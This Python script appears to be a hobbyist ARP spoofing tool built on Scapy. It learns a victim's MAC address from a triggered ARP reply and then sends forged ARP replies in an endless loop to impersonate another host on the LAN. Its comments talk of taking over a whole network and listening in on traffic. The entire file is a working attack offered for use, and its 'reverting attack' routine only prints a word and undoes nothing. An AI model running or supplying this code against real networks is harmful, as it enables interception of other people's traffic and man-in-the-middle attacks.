from scapy.all import conf,get_if_addr,get_if_hwaddr,ARP,Ether,sendp, sniff
import time
#import sys
from multiprocessing import Process 
#import os 


iface = conf.iface
MyMAC = get_if_hwaddr(iface)
MyIP = get_if_addr(iface)

fake_mac = "08:00:27:aa:97:97"
fake_ip= "192.168.1.115" #who we are impersonating
ip_victim="192.168.1.101"
mac_victim = ""

#newest python bversions dont need import keyboard
#sys.stderr = open(os.devnull , 'w') #OMIT ANY "error" output


def packet_handler(pkt):
    global mac_victim
    if ARP in pkt:
        if pkt[ARP].op == 2:
            if pkt[ARP].psrc == ip_victim and pkt[ARP].pdst == fake_ip:
                mac_victim = pkt[ARP].hwsrc
                return True
    return False

def sniffer():
    #global mac_victim
    #global MyMAC
    #global ip_victim
    #global fake_mac
    #global fake_ip
    sniff(filter = "arp", stop_filter  = packet_handler)
    poison(fake_mac,MyMAC,fake_ip,ip_victim)
 

def poison (mac_fake,mac_real,ip_host,ip_vict):
    #we need the dst on the ethernet method, if not uour ip real will get loggedo n the arp table of the vicmtims
    #it seems that on some OSes there is a sec countermeaseure, if the reply comes from an ip that is not even saved o nthe arp table, then
    #it wont accept it, we need to do this 1st a reqeust this the OS will accept , the reqeust will be based on a fake ip
    #now we can reply based on tha fake one
    #you knwo what? we can even own a whole lan if we run a whole of scritps of python on fake requst #
    #the oS of the pcs will received and based on htose, we jsut chagne the mac, we just need to wait for devices to connect
    #eventually host will connect using those fake ones ips we just used, and from there is just listen
    while True:
        frame = Ether(src = mac_fake, dst = mac_victim)/ARP(op = 2, psrc = ip_host , pdst = ip_vict , hwsrc = mac_fake, hwdst = mac_victim)
        sendp(frame,iface=iface, count = 1 ,inter = 0.5, verbose = 2)
             
   
def potion():
    print("ASheyyy")

        
 
def trigger():
    global p2
    frame = Ether(src = MyMAC)/ARP(op = 1, psrc = fake_ip , pdst = ip_victim , hwsrc = MyMAC)
    sendp(frame,iface=iface, count = 1, verbose = 0)
    #p2.terminate()
    #p2.join()


"""    
def main ():
    sys.stderr = open(os.devnull , 'w')

    try:
        p1 = Process(target=sniffer)
        p2 = Process(target=trigger)
        p1.start()
        p2.start()
        while True:
            time.sleep(0.2)

    except KeyboardInterrupt:
        print("REVERTING ATTACK...WAIT...")
        potion()
        p1.terminate()
        p1.join()


if __name__ == "__main__":
    main()
"""
try:
    p1 = Process(target=sniffer)
    p2 = Process(target=trigger)
    p1.start()
    p2.start()
    while True:
        time.sleep(0.2)

except KeyboardInterrupt:
    print("REVERTING ATTACK...WAIT...")
    potion()
    p1.terminate()
    p1.join()
    p2.terminate()
    p2.join()